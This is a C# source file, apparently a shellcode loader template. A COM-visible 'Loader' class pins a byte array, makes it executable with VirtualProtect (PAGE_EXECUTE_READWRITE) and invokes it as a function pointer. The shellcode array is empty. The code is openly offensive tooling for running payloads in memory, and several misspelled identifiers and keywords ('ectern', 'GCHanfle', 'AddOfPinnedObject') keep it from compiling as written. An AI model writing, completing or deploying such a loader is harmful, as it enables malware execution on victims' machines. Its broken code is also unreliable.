using System;
using System.Collection.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Loader
{
    [ComVisible(true)]
    public class Loader{
        private delegate IntPtr SC();

        [DllImport("kernel32.dll")]
        
        public static ectern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect, out UInt32 lpflOldProtect);
        
        private void InjectPayload(byte[] shellcode)
        {
            //provide a way to access a managed object from unmanaged memory
            GCHanfle gch = GCHandle.Alloc(shellcode, GCHandleType.Pinned);

            //Shellcode is pinned to protect it from being moved by the garbage collector in memory
            IntPtr ptr = gch.AddOfPinnedObject();
            uint OldProtect;

            // Change the protection to make the shellcode executable (0x40 = PAGE_EXECUTE_READWRITE)
            if (VirtualProtect(ptr, (UIntPtr)shellcode.Length, 0x40, out OldProtect))
            {
                // Shellcode is executed using a mashalled delgate
                SC sc = (SC)Marshal.GetDelegateForFunctionPointer(ptr, typeof(SC));
                sc();
            }
        }

        public Loader()
        {
            //shellcode will be stored here
            byte[] shellcode = { };

            //Inject and execute the shellcode
            InjectPayload(shellcode);
        }
    }
}